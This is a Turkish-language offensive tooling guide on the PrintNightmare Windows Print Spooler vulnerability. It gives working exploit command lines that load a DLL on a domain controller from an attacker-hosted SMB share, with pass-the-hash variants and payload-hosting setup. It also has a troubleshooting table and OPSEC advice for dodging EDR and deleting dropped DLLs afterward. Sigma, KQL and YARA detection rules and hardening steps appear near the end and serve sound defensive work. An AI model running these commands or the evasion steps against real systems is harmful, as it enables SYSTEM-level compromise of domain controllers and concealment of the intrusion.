# PrintNightmare (CVE-2021-1675 / CVE-2021-34527)

> **Kategori:** [13. Tarihi ve Kritik Zafiyet Araçları](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Windows Print Spooler (`spoolsv.exe`) servisindeki `RpcAddPrinterDriverEx` RPC işlevinin yetki denetimi hatasını istismar ederek, düşük yetkili bir etki alanı kullanıcısıyla hedef sistemde ve etki alanı denetleyicilerinde uzaktan SYSTEM yetkisinde rastgele DLL yürüten sömürü aracı.

---

## 1. Genel Bakış ve Amaç

Windows işletim sistemlerinde yazdırma işlerini yöneten **Print Spooler (`spoolsv.exe`)** servisi, `[MS-RPRN]` (Print System Remote Protocol) ve `[MS-PAR]` (Print System Asynchronous Remote Protocol) protokolleri üzerinden ağ istemcilerine yazdırma hizmeti sunar. Tarihsel olarak bu servis, kullanıcı iş istasyonlarının yanı sıra etki alanı denetleyicileri (Domain Controller) dahil tüm Windows sunucularında varsayılan olarak açık bırakılmıştır.

Haziran ve Temmuz 2021'de ortaya çıkan **PrintNightmare** (CVE-2021-1675 / CVE-2021-34527), Print Spooler servisinin yazıcı sürücüsü yükleme mekanizmasındaki kritik bir tasarım kusurunu hedefler. Normal şartlarda yazıcı sürücüsü yüklemek (`RpcAddPrinterDriverEx` veya `RpcAsyncAddPrinterDriver` RPC çağrıları) yüksek yönetici ayrıcalıkları (`SeLoadDriverPrivilege`) gerektirmelidir. Ancak bu fonksiyonda:
1. `APD_COPY_ALL_FILES` bayrağı kullanıldığında, istemcinin belirttiği uzak bir SMB paylaşımından (`\\attacker_ip\share\payload.dll`) sürücü dosyalarının hedef sunucuya indirilmesine izin verilmiştir.
2. Servis, uzaktan bağlanan kullanıcının yetkilerini doğrulamaksızın, indirilen DLL dosyasını `C:\Windows\System32\spool\drivers\x64\3\` dizinine kopyalamış ve en yüksek sistem yetkisinde çalışan `spoolsv.exe` süreci altında `LoadLibraryExW` API'siyle belleğe yüklemiştir.

Bu durum, etki alanındaki en düşük yetkili kullanıcı hesabının (`Domain Users`), Active Directory ortamındaki herhangi bir sunucuda veya doğrudan etki alanı denetleyicisinde hiçbir yerel erişim olmaksızın uzaktan **SYSTEM (ve dolayısıyla Domain Admin)** yetkisinde kod çalıştırmasına olanak tanımıştır.

### Mimari Akış Şeması

```
+-----------------------------------------------------------------------------------+
|                         PRINTNIGHTMARE MIMARI AKIŞI                               |
+-----------------------------------------------------------------------------------+
  [Düşük Yetkili Kullanıcı]                          [Hedef DC / Windows Sunucu]
    (PrintNightmare.py)                                 (spoolsv.exe - SYSTEM)
             |                                                    |
             |--- 1. SMB / RPC Bağlantısı (TCP 445 / Named Pipe)->|
             |       [Bağlantı: \pipe\spoolss / MS-RPRN Interface]|
             |                                                    |
             |--- 2. RpcAddPrinterDriverEx Çağrısı -------------->|--- 2. spoolsv.exe
             |       [Parametre: APD_COPY_ALL_FILES]              |       Yetki Kontrolünü
             |       [pDriverPath: \\attacker\share\evil.dll]     |       Atlar (SYSTEM)
             |                                                    |
  [Saldırgan SMB Sunucusu]                                        |--- 3. SMB Dosya Çekme
             |<-- 3. evil.dll İndirme İsteği (Port 445) ----------|       (Hedef DC Saldırgana
             |--- 4. evil.dll Dosyası Hedefe Gönderilir --------->|       Bağlantı Açar)
             |                                                    |
             |                                                    |--- 5. evil.dll Diske Yazılır
             |                                                    |       C:\Windows\System32\
             |                                                    |       spool\drivers\x64\3\
             |                                                    |
             |                                                    |--- 6. LoadLibraryEx(evil.dll)
             |                                                    |       spoolsv.exe İçinde
             |<-- 7. SYSTEM Yetkisinde Komut / Ters Kabuk --------|       Kod Yürütülür!
```

### Neden Önemli?

| Yetenek | Operasyonel Avantaj | Alternatif Zafiyetlere Üstünlüğü |
| :--- | :--- | :--- |
| **Düşük Yetkiden SYSTEM'e**| Standart domain kullanıcısıyla tam etki alanı kontrolü sağlar.| DC üzerinde yerel yönetici veya DCSync haklarına ihtiyaç bırakmaz. |
| **Doğrudan Kod Yürütme** | Parola sıfırlaması yapmaz (Zerologon'dan farklıdır). | Active Directory replikasyonunu bozmadan kod yürütür. |
| **Hem RCE Hem LPE** | Hem ağ üzerinden uzaktan hem de yerel hak yükseltmede çalışır.| Sızma testlerinde iki farklı saldırı aşamasını tek açıkla çözer. |
| **Geniş Hedef Yelpazesi** | Windows 7'den Server 2019'a kadar tüm sürümleri etkilemiştir.| Kurumsal ağlarda çok sayıda yamalanmamış uç nokta bulma imkanı tanır. |
| **Pass-the-Hash Uyumu** | Düz metin şifre gerekmeden NTLM hash ile tetiklenebilir.| Ele geçirilen hash'lerle doğrudan uzaktan kod yürütmeyi sağlar. |

### Karşılaştırma Tablosu

| Özellik | PrintNightmare (CVE-2021-34527) | Zerologon (CVE-2020-1472) | noPac (CVE-2021-42287) | SpoolSample (Zorlamalı Kimlik) |
| :--- | :--- | :--- | :--- | :--- |
| **Gereken Yetki** | Standart Domain Kullanıcısı | Anonim (Kimliksiz) | Standart Domain Kullanıcısı | Standart Domain Kullanıcısı |
| **Kullanılan Protokol** | MS-RPRN (Print Spooler RPC) | MS-NRPC (Netlogon RPC) | Kerberos KDC & SAM | MS-RPRN (RpcRemoteFindFirstPrinterChangeNotificationEx) |
| **Elde Edilen Sonuç** | SYSTEM Yetkisinde Kod Yürütme | DC Makine Parolası Sıfırlanır| Domain Admin TGT Bileti | NTLMv2 Kimlik Doğrulama Tetikleme |
| **Replikasyonu Bozar mı?**| Hayır (Kararlı) | Evet (Acil onarım gerekir) | Hayır (Kararlı) | Hayır |
| **Yükleme Gereksinimi** | Harici SMB Paylaşımında DLL | Bağımsız RPC İstismarı | Bağımsız Kerberos Biletleri | NTLM Dinleme İstasyonu |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

PrintNightmare istismar araçları (Cube0x0 veya Impacket tabanlı Python betikleri), hedef sistem, kimlik bilgileri ve saldırganın barındırdığı paylaşılan DLL yolu ile çalıştırılır:

```bash
python3 CVE-2021-1675.py <DOMAIN>/<KULLANICI>:<PAROLA>@<HEDEF_IP> '\\<SALDIRGAN_IP>\<PAYLASIM>\<PAYLOAD.DLL>'
```

### Desteklenen Kritik Bayraklar

| Parametre | Açıklama | Örnek Değer |
| :--- | :--- | :--- |
| `<DOMAIN>/<USER>:<PASS>` | Kimlik doğrulamada kullanılacak domain kullanıcısı ve parolası. | `corp.local/jdoe:Pass2026!` |
| `@<TARGET_IP>` | Hedef Windows sunucusunun veya DC'nin IP adresi. | `@192.168.1.10` |
| `'\\<IP>\<SHARE>\<DLL>'` | Hedef sunucunun çekeceği saldırgan SMB paylaşımındaki DLL yolu. | `'\\192.168.1.100\share\malicious.dll'` |
| `-hashes` | Düz metin şifre yerine NTLM hash (Pass-the-Hash) kullanır. | `-hashes :329153f560eb344c3f9e3ec4e086166f` |
| `-target-ip` | Hedef sunucunun IP adresi (FQDN yerine doğrudan IP belirtildiğinde). | `-target-ip 192.168.1.10` |
| `-port` | RPC iletişim portu (Varsayılan: 445 SMB Named Pipe üzerinden `\spoolss`). | `-port 445` |

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: Düşük Yetkili Kullanıcı ile Uzaktan SYSTEM DLL Yürütme (RCE)
Etki alanındaki sıradan bir kullanıcı hesabıyla, saldırgan makinedeki Samba paylaşımında bulunan DLL'i DC üzerinde tetikleme:

```bash
python3 CVE-2021-1675.py corp.local/jdoe:Pass2026!@192.168.1.10 '\\192.168.1.100\share\beacon.dll'
```

**Konsol Çıktı Analizi:**
```
[*] Target: 192.168.1.10
[*] Connecting to MS-RPRN interface at \pipe\spoolss...
[*] Binding to Print System Remote Protocol...
[+] Successfully bound to MS-RPRN!
[*] Target OS: Windows Server 2016 Standard (Build 14393)
[*] Sending RpcAddPrinterDriverEx payload...
[*] Stage 1: Pushing driver info structure (DRIVER_INFO_2)...
[*] Stage 2: Specifying remote driver path: \\192.168.1.100\share\beacon.dll
[+] RpcAddPrinterDriverEx succeeded! Return code: 0x0
[*] Spooler is now loading the DLL as NT AUTHORITY\SYSTEM...
[+] Exploit completed successfully!
```

### Senaryo 2: NTLM Hash (Pass-the-Hash) ile PrintNightmare Çalıştırma
Düz metin parolanın bulunmadığı ancak NTLM hash'in elde edildiği durumlarda istismar:

```bash
python3 CVE-2021-1675.py corp.local/srv_user@192.168.1.10 -hashes :329153f560eb344c3f9e3ec4e086166f '\\192.168.1.100\share\beacon.dll'
```

**Konsol Çıktı Analizi:**
```
[*] Authenticating using NTLM Hash...
[+] SMB Session established via NTLMSSP!
[+] Successfully loaded DLL on target!
```

### Senaryo 3: NetExec ile PrintNightmare Zafiyet Taraması (Güvenli Mod)
Ağdaki sistemlerin PrintNightmare açığı barındırıp barındırmadığını exploit çalıştırmadan tarama:

```bash
nxc smb 192.168.1.0/24 -u jdoe -p Pass2026! -M printnightmare
```

**Konsol Çıktı Analizi:**
```
SMB         192.168.1.10    445    DC01             [*] Windows Server 2016 Standard
SMB         192.168.1.10    445    DC01             [+] DC01 is VULNERABLE to PrintNightmare!
SMB         192.168.1.20    445    FS01             [-] FS01 is NOT vulnerable (Print Spooler Disabled).
```

### Senaryo 4: rpcdump ile Hedefte MS-RPRN Servisinin Açık Olduğunu Doğrulama
İstismar öncesinde hedef sistemde Print Spooler RPC arayüzünün erişilebilirliğini teyit etme:

```bash
impacket-rpcdump 192.168.1.10 | grep -E "MS-RPRN|spoolss"
```

**Konsol Çıktı Analizi:**
```
Protocol: [MS-RPRN]: Print System Remote Protocol
Provider: spoolsv.exe
UUID: 12345678-1234-abcd-ef00-0123456789ab v1.0
Binding: ncacn_np:\\DC01[\pipe\spoolss]
```

### Senaryo 5: Linux Samba Anonim Paylaşım Yapılandırması (DLL Barındırma)
Hedef Windows sunucusunun kimlik doğrulaması olmadan DLL'i çekebilmesi için Linux üzerinde anonim SMB paylaşımı açma:

```bash
mkdir /tmp/share
cp /opt/payloads/rev.dll /tmp/share/rev.dll
smbserver.py share /tmp/share -smb2support
```

**Konsol Çıktı Analizi:**
```
Impacket v0.12.0 - Copyright Fortra, LLC
[*] Config registering...
[*] Config smb2support: True
[*] Server listening on 0.0.0.0:445...
[*] Incoming connection from 192.168.1.10 (DC01$)
[*] AUTHENTICATE_MESSAGE (\anonymous)
[+] Client requested: rev.dll -> 524288 bytes transferred to DC01$
```

### Senaryo 6: Yerel Hak Yükseltme (LPE) Modunda C# ile Çalıştırma
Saldırgan zaten hedef makinede oturum açmışsa, harici SMB paylaşımına gerek kalmadan yerel diskteki bir DLL ile hak yükseltme:

```cmd
PrintNightmare-LPE.exe C:\Windows\Temp\payload.dll
```

**Konsol Çıktı Analizi:**
```
[+] Target: Localhost
[+] Loading local DLL via AddPrinterDriverEx...
[+] Process created with token: NT AUTHORITY\SYSTEM
[+] Spawning elevated shell...
```

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Kodu / Mesajı | Kök Neden | Kesin Çözüm Adımı |
| :--- | :--- | :--- |
| `RpcAddPrinterDriverEx failed (ERROR_ACCESS_DENIED / 0x5)` | Hedef sistem KB5005010 veya KB5005652 güvenlik yamasıyla güncellenmiş; yönetici olmayanların sürücü yüklemesi kısıtlanmış. | Hedef yamalıdır; `RestrictDriverInstallationToAdministrators = 1` kaydı devrededir. Alternatif yanal hareket yöntemlerine yönelin. |
| `STATUS_BAD_NETWORK_NAME / Cannot access UNC share` | Hedef sunucu belirtilen `\\attacker\share` yoluna erişemiyor veya saldırgan güvenlik duvarı port 445'i engelliyor. | Samba paylaşım yolunun tam doğru olduğunu teyit edin; `smbserver.py` çalıştırdığınız makinede port 445'in hedefe açık olduğunu kontrol edin. |
| `spoolsv.exe service crashed (STATUS_CONNECTION_DISCONNECTED)` | Hatalı derlenmiş veya mimari uyumsuz (x86 vs x64) DLL yüklenmesi sonucu Print Spooler servisi çöktü. | DLL'in hedef mimariyle (64-bit) birebir uyumlu olduğunu teyit edin; servis Windows tarafından otomatik yeniden başlatılacaktır (1-2 dk bekleyin). |
| `Failed to bind to \pipe\spoolss (STATUS_OBJECT_NAME_NOT_FOUND)` | Hedef sistemde `Print Spooler` servisi durdurulmuş veya devre dışı bırakılmış. | Hedefte servis kapalıdır; bu sistemde PrintNightmare çalışmaz. |
| `ERROR_PRINTER_DRIVER_ALREADY_INSTALLED (0xbc2)` | Aynı isimli sürücü yapılandırması hedefte daha önce yüklenmiş ve kilitli kalmış. | İstismar betiğindeki yazıcı sürücüsü adını (`pName`) rastgele bir dizeyle (`Driver_91823`) değiştirin. |
| `SMB Session: STATUS_ACCOUNT_RESTRICTED` | Anonim paylaşıma hedef makine erişirken misafir (guest) hesap kısıtlamasına takılıyor. | `smbserver.py` çalıştırırken `-username` ve `-password` parametresi verip exploit betiğinde de bu kimlik bilgilerini kullanın. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

```
[OPSEC GÜRÜLTÜ SKALASI: YÜKSEK]
0 ------------------------------------[8.5 - SPOOLSV PROCESS ANOMALY] 10
  - Ağ Seviyesi: MS-RPRN Named Pipe trafiği ve hedefin dışarıya açtığı SMB dosya çekme isteği
  - Uç Nokta Seviyesi: spoolsv.exe'nin DLL yüklemesi ve alt süreç (cmd/powershell) başlatması (EDR alarmı)
```

### 5.1 Bırakılan İzler (Event Logs)

* **Microsoft-Windows-PrintService/Operational (Event ID 316 - Sürücü Ekleme):**
  * `Printer driver [Driver_Name] was added or updated.`
  * Sisteme yeni bir yazıcı sürücüsü eklendiğinde bu günlüğe sürücü dosyası yoluyla birlikte yazılır.
* **Microsoft-Windows-PrintService/Admin (Event ID 808):**
  * Eğer DLL bozuksa veya yükleme başarısız olursa, `spoolsv.exe` bu olayla hata basar.
* **Sysmon Event ID 1 / Security Event ID 4688 (Process Creation):**
  * **ParentImage:** `C:\Windows\System32\spoolsv.exe`
  * **Image:** `C:\Windows\System32\cmd.exe` veya `powershell.exe`
  * Meşru ortamlarda Print Spooler asla komut kabuğu başlatmaz. Bu ebeveyn-çocuk ilişkisi tüm SIEM ve EDR'lar için en kesin IOC'dir.
* **Sysmon Event ID 11 (FileCreate):**
  * `C:\Windows\System32\spool\drivers\x64\3\Old\` veya `New\` dizininde oluşturulan şüpheli DLL dosyaları.
* **Sysmon Event ID 7 (ImageLoad):**
  * `spoolsv.exe` sürecinin imzasız veya geçici bir dizinden DLL yüklemesi.

### 5.2 Ağ ve EDR İmzaları

* **Giden SMB Trafiği (Egress SMB):**
  Hedef sunucunun, saldırganın IP adresine 445 portundan bağlanıp dosya talep etmesi, ağ seviyesinde olağan dışı sunucu trafiği olarak işaretlenir.
* **EDR Davranışsal Tespiti:**
  Modern EDR sensörleri (Defender for Endpoint, CrowdStrike), `spoolsv.exe` tarafından başlatılan bellek enjeksiyonu ve alt süreç aktivitelerini doğrudan "PrintNightmare Exploitation Attempt" kuralıyla engeller.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Taktik | Teknik ID | Teknik Adı | Operasyonel Kullanım |
| :--- | :--- | :--- | :--- |
| **Execution** | `T1210` | Exploitation of Remote Services | MS-RPRN arayüzü üzerinden uzaktan kod yürütme. |
| **Privilege Escalation** | `T1068` | Exploitation for Privilege Escalation | Düşük yetkili hesaptan SYSTEM yetkisine yükselme. |
| **Persistence / Defense Evasion** | `T1574.002` | Hijack Execution Flow: DLL Side-Loading | Spooler sürücü dizininden kötü amaçlı DLL yükletme. |

### 5.4 OPSEC Önerileri

| Tespit Riski | Önlem / İyileştirme |
| :--- | :--- |
| **`spoolsv.exe -> cmd.exe` Ağacı** | Yüklenen DLL komut kabuğu başlatmamalı; arka planda sessizce bir servis oluşturmalı veya token manipülasyonu yapmalıdır. |
| **Disk İzi (Spool Sürücü Klasörü)** | Kopyalanan DLL `C:\Windows\System32\spool\drivers\x64\3\` altında kalır; operasyon sonrası temizlenmelidir. |
| **Ağ Taraması** | NetExec gibi araçlarla önce zafiyetin varlığı doğrulanmalı, körlemesine istismar denenmemelidir. |
| **Giden SMB Engeli** | Kurumsal ağlarda sunucuların dışarıya SMB (445) açması engelliyse, SMB paylaşımı hedefle aynı alt ağda barındırılmalıdır. |

### 5.5 Savunma Karşılığı

#### Sigma Kuralı: Print Spooler Tarafından Şüpheli Alt Proses Başlatılması
```yaml
title: spoolsv.exe Tarafindan Supheli Alt Surec Baslatilmasi (PrintNightmare)
id: 88129402-4412-4c88-b112-998811aa2233
status: experimental
description: PrintNightmare istismari sonucu Print Spooler servisi (spoolsv.exe) altinda baslatilan komut kabuklarini tespit eder.
references:
    - https://attack.mitre.org/techniques/T1068/
author: Active Directory Guvenlik Ekibi
date: 2026/10/14
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        ParentImage|endswith: '\spoolsv.exe'
        Image|endswith:
            - '\cmd.exe'
            - '\powershell.exe'
            - '\pwsh.exe'
            - '\rundll32.exe'
            - '\net.exe'
            - '\whoami.exe'
    condition: selection
falsepositives:
    - Ozel faks/yazici yonetim yazilimlarinin kurulum scriptleri (cok nadir).
level: critical
tags:
    - attack.execution
    - attack.t1210
    - attack.t1068
```

#### Microsoft Sentinel KQL Sorgusu
```kql
// spoolsv.exe tarafindan baslatilan surecleri ve iliskili driver DLL yuklemelerini tespit eder
DeviceProcessEvents
| where InitiatingProcessFileName =~ "spoolsv.exe"
| where FileName in~ ("cmd.exe", "powershell.exe", "rundll32.exe", "net.exe")
| project TimeGenerated, DeviceName, InitiatingProcessFileName, FileName, ProcessCommandLine, AccountName
| join kind=inner (
    DeviceFileEvents
    | where FolderPath has @"\spool\drivers\x64\"
    | where ActionType == "FileCreated"
    | project FileTime = TimeGenerated, DeviceName, FileName, FolderPath
) on DeviceName
| project TimeGenerated, DeviceName, AccountName, ProcessCommandLine, FolderPath
```

#### YARA Kuralı: PrintNightmare Exploit ve RPC Çağrı İmzası
```yara
rule Threat_Exploit_PrintNightmare_RPC {
    meta:
        description = "PrintNightmare RpcAddPrinterDriverEx istismar kodlarini tespit eder"
        author = "AD Guvenlik Laboratuvari"
        date = "2026-10-14"
        severity = "Critical"
    strings:
        $s1 = "RpcAddPrinterDriverEx" ascii wide
        $s2 = "APD_COPY_ALL_FILES" ascii wide
        $s3 = "spoolss" ascii wide
        $s4 = "12345678-1234-abcd-ef00-0123456789ab" ascii wide
    condition:
        all of ($s*)
}
```

#### Sertleştirme (Hardening) Adımları
1. **Etki Alanı Denetleyicilerinde Spooler'ı Kapatma:** Domain Controller sunucuları fiziksel yazdırma yapmaz. Tüm DC'lerde Print Spooler servisi derhal kapatılmalı ve devre dışı bırakılmalıdır:
   ```powershell
   Stop-Service -Name Spooler -Force
   Set-Service -Name Spooler -StartupType Disabled
   ```
2. **Point and Print Kısıtlamaları (KB5005652):** Kayıt defterinde `HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint` altında:
   * `RestrictDriverInstallationToAdministrators = 1`
   yapılarak standart kullanıcıların sürücü yüklemesi engellenmelidir.
3. **GPO ile Ağ Yazdırma Güvenliği:** "Computer Configuration -> Policies -> Administrative Templates -> Printers -> Allow Print Spooler to accept client connections" ilkesi "Disabled" yapılmalıdır.

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Cheat Sheet)

#### 1. Standart Parola ile PrintNightmare RCE
```bash
python3 CVE-2021-1675.py corp.local/jdoe:Pass123!@192.168.1.10 '\\192.168.1.100\share\evil.dll'
```
* **Ne Yapar?:** MS-RPRN üzerinden uzaktaki sunucuda SYSTEM yetkisinde DLL dosyasını çalıştırır.
* **Ne Zaman Kullanılır?:** Hedef sunucuda Print Spooler açık ve standart kullanıcı hesabı mevcut olduğunda.
* **Parametreler:** `<domain>/<user>:<pass>@<ip>`, uzak SMB DLL yolu.

#### 2. Pass-the-Hash ile PrintNightmare Çalıştırma
```bash
python3 CVE-2021-1675.py corp.local/jdoe@192.168.1.10 -hashes :329153f560eb344c3f9e3ec4e086166f '\\192.168.1.100\share\evil.dll'
```
* **Ne Yapar?:** Parola yerine NTLM hash kullanarak uzaktan kod yürütmeyi tetikler.
* **Ne Zaman Kullanılır?:** Düz metin şifre olmadan hash ile yanal hareket yaparken.
* **Parametreler:** `-hashes` bayrağı.

#### 3. NetExec ile Spooler Servis Taraması
```bash
nxc smb 192.168.1.0/24 -u jdoe -p Pass123! -M printnightmare
```
* **Ne Yapar?:** Ağdaki tüm sistemlerde Print Spooler açığını zarar vermeden test eder.
* **Ne Zaman Kullanılır?:** Kurumsal ağda savunmasız sunucuları önceden haritalamak için.
* **Parametreler:** `-M printnightmare`.

#### 4. rpcdump ile MS-RPRN Tespiti
```bash
impacket-rpcdump 192.168.1.10 | grep -i "MS-RPRN"
```
* **Ne Yapar?:** Hedef sistemde Print Spooler RPC uç noktasının dinlemede olup olmadığını kontrol eder.
* **Ne Zaman Kullanılır?:** Port 445 üzerinde spoolss named pipe varlığını doğrulamak için.
* **Parametreler:** `rpcdump` çıktısı filtreleme.

#### 5. Linux Samba Anonim Paylaşım Başlatma
```bash
smbserver.py share /opt/payloads -smb2support
```
* **Ne Yapar?:** Hedef sunucunun kimlik doğrulamasız DLL indirebileceği yerel SMB sunucusu açar.
* **Ne Zaman Kullanılır?:** PrintNightmare exploit'ine payload sağlamak için.
* **Parametreler:** `share` paylaşım adı, dizin yolu, `-smb2support`.

#### 6. DC Üzerinde Spooler Servisini Kapatma
```powershell
Stop-Service Spooler -Force; Set-Service Spooler -StartupType Disabled
```
* **Ne Yapar?:** Print Spooler servisini durdurur ve başlangıç türünü devre dışı bırakır.
* **Ne Zaman Kullanılır?:** DC'lerde PrintNightmare zafiyetini anında ortadan kaldırmak için (Sertleştirme).
* **Parametreler:** PowerShell servis yönetim komutları.

#### 7. GPO ile Print Spooler Servisini Devre Dışı Bırakma
```cmd
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Spooler" /v Start /t REG_DWORD /d 4 /f
```
* **Ne Yapar?:** Kayıt defteri üzerinden Spooler servis başlangıç türünü `Disabled` yapar.
* **Ne Zaman Kullanılır?:** Komut satırından hızlı sıkılaştırma uygularken.
* **Parametreler:** `reg add` komutu.

#### 8. Point and Print Yönetici Zorunluluğu Getirme
```cmd
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint" /v RestrictDriverInstallationToAdministrators /t REG_DWORD /d 1 /f
```
* **Ne Yapar?:** Yalnızca yerel yöneticilerin sürücü yüklemesine izin verir.
* **Ne Zaman Kullanılır?:** Yazıcı servisini kapatamayan sistemlerde zafiyeti yamalamak için.
* **Parametreler:** `RestrictDriverInstallationToAdministrators = 1`.

#### 9. PrintService/Operational Günlüğünü Etkinleştirme
```powershell
wevtutil sl "Microsoft-Windows-PrintService/Operational" /e:true
```
* **Ne Yapar?:** Ayrıntılı yazıcı sürücüsü yükleme loglarını aktif hale getirir.
* **Ne Zaman Kullanılır?:** Adli izleme ve SIEM korelasyonu sağlamak için.
* **Parametreler:** `wevtutil` log yönetimi.

#### 10. Spool Sürücü Klasöründeki Şüpheli DLL'leri Temizleme
```cmd
del /f /q C:\Windows\System32\spool\drivers\x64\3\*.dll
```
* **Ne Yapar?:** İstismar sonrası spooler dizinine kopyalanmış geçici sürücü DLL'lerini temizler.
* **Ne Zaman Kullanılır?:** Test tamamlandıktan sonra adli izleri ortadan kaldırmak için.
* **Parametreler:** `del /f /q`.

---

## Kaynaklar
* [Microsoft Güvenlik Bülteni: CVE-2021-34527 (Windows Print Spooler Remote Code Execution)](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527)
* [Microsoft Dokümantasyonu: [MS-RPRN] Print System Remote Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/)
* [MITRE ATT&CK: Exploitation of Remote Services (T1210)](https://attack.mitre.org/techniques/T1210/)
* [Cube0x0 PrintNightmare GitHub Deposu](https://github.com/cube0x0/CVE-2021-1675)
* [HackTricks: PrintNightmare (CVE-2021-1675 / CVE-2021-34527)](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/printnightmare-cve-2021-1675)

---

> **Önceki:** [← restorepassword](./restorepassword.md) · **Sonraki:** [noPac / sam-the-admin →](./noPac_sam-the-admin.md)
